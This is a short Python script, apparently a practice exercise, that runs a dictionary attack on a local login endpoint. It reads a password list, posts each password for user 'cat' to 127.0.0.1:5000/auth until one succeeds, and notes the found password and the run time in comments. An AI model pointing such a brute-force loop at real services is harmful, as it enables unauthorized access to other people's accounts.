import requests

with open('tenmillionpass.txt') as passwords_file:
    passwords = passwords_file.readlines()

# clean_passwords = []
# for password in passwords:
#     clean_passwords.append(password[:-1])

clean_passwords = [password[:-1] for password in passwords]

for password in clean_passwords:
    print(password)
    response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'cat', 'password': password})
    if response.status_code == 200:
        print('Success!', 'cat', password)
        break

# 'dog'
# real	1m51.040s
# user	1m8.315s
# sys	0m5.805s

